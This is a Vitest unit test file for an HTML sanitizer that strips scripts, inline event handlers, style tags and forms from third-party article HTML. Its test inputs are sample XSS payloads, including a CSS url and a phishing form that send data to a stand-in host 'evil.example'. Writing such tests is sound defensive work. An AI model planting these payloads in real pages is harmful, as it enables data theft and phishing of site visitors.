/**
 * @vitest-environment jsdom
 */
import { describe, expect, it } from 'vitest';

import { sanitizeHtml } from '@/components/DomPurify.js';

describe('sanitizeHtml', () => {
    it('strips script tags from third-party article HTML', () => {
        const malicious = '<p>Hello</p><script>alert("xss")</script>';
        expect(sanitizeHtml(malicious)).toBe('<p>Hello</p>');
    });

    it('strips inline event handlers from article HTML', () => {
        const malicious = '<img src="x" onerror="alert(1)" />';
        expect(sanitizeHtml(malicious)).toBe('<img src="x">');
    });

    it('preserves safe article markup', () => {
        const safe = '<p class="embed">Article body</p>';
        expect(sanitizeHtml(safe)).toBe('<p class="embed">Article body</p>');
    });

    it('strips style tags to prevent CSS-based exfiltration/UI redress', () => {
        const malicious = '<p>Hello</p><style>body { background: url("https://evil.example/leak") }</style>';
        expect(sanitizeHtml(malicious)).toBe('<p>Hello</p>');
    });

    it('strips form tags to prevent phishing forms in article content', () => {
        const malicious = '<p>Hello</p><form action="https://evil.example/collect"><input name="password"></form>';
        expect(sanitizeHtml(malicious)).toBe('<p>Hello</p>');
    });
});
